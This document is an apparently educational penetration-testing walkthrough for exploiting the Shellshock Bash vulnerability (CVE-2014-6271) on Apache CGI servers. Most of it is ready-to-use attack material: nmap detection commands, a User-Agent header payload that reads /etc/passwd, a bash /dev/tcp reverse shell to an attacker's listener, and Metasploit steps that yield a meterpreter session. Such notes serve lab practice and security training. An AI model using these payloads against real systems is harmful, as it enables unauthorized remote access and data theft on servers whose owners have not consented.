# 1 - Exploiting Bash CVE-2014-6271 Vulnerability Shellshock

### **CVE-2014-6271 - Shellshock**

* Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.
* The Shellshock vulnerability was discovered by StÃ©phane Chazelas on the 12th of September 2014 and was made public on the 24 September 2014.
* Bash is a \*Nix shell that is part of the GNU project and is the default shell for most Linux distributions.
* The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.
* This vulnerability only affects Linux as Windows does not utilize Bash as it is not a \*Nix based operating system.
* In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
* CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.

### **Shellshock Exploitation**

* In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.
* In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.
* Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.
* This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.



## **Practical Demonstration**

`nmap -sV $ip` - scan.

First, look in the source code of the page of the web server to find .cgi scripts that are being used.

`nmap sV $ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`  - Check if the web server is vulnerable to Shellshock with Nmap, the pathToCgiScript is "/gettime.cgi"

### Manual Exploitation using BurpSuite

1 - First, change the proxy to the BurpSuite proxy (with FoxyProxy for convenience).

2 - In BurpSuite, make sure that Proxy > Intercept is on.Then, refresh the cgi script page to intercept it with BurpSuite. In this case we are going to be injecting the special characters in the "User Agent Http Header"

3 - Send the intercepted info to the repeater (Right click -> Send to repeater).

4 - Change the user-agent content to:&#x20;

`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

Then click send and watch the result of the command in the Response tab.

#### To get a reverse shell using Shellshock and BurpSuite:

`nc -nlvp 1234` - Set up a listener with Netcat on kali.

Enter malicious code into the BurpSuite request: by replacing the `'cat /etc/passwd'` field with..

`'bash -i>&/dev/tcp/$kali_ip/1234 0>&1'` &#x20;

Hit Send and we get a session from our listener.

### Automatic Exploitation with MSF

```bash
# start msfconsole.
service postgres start && msfconsole
search shellshock

# 1
# check if the server is vulnerable to the exploit
use auxiliary/scanner/http/apache_mod_cgi_bash_env

# 2
# the exploit module
use exploit/multi/http/apache_mod_cgi_bash_env_exec
options
set RHOSTS $ip
set TARGETURI /gettime.cgi
exploit
# we get a meterpreter session.
```

